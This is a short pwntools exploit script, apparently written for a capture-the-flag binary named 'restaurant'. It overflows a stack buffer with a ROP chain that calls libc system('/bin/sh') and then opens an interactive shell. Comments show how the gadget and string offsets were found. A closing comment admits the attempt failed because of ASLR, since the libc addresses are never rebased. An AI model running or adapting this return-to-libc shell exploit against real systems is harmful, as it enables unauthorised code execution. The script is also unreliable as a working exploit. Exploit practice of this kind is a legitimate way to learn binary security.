from pwn import *
context.clear(arch='amd64')

ip, port = "127.0.0.1",1234
io = process('./restaurant')
#io = remote(ip, port)

elf = ELF('./libc.so.6')

#strings -tx libc.so.6 |grep /bin/sh
# 1b3e1a /bin/sh

sh_addr = p64(0x1b3e1a)
sys_addr = p64(elf.symbols['system'])

#ROPgadget --binary libc.so.6 |grep "pop rdi ; ret"
#0x00000000000215bf : pop rdi ; ret

pop_addr = p64(0x215bf)


io.recvuntil('>')
io.sendline('1')
io.recvuntil('>')

padding = 'A'*(0x20+0x08)
#addr = 'B'*8

payload = padding+pop_addr+sh_addr+sys_addr
io.sendline(payload)
io.recv()
#gdb.attach(io)
#gdb ./restaurant core

io.interactive()
#!!Failed as libc.so.6 is loaded with ASLR.
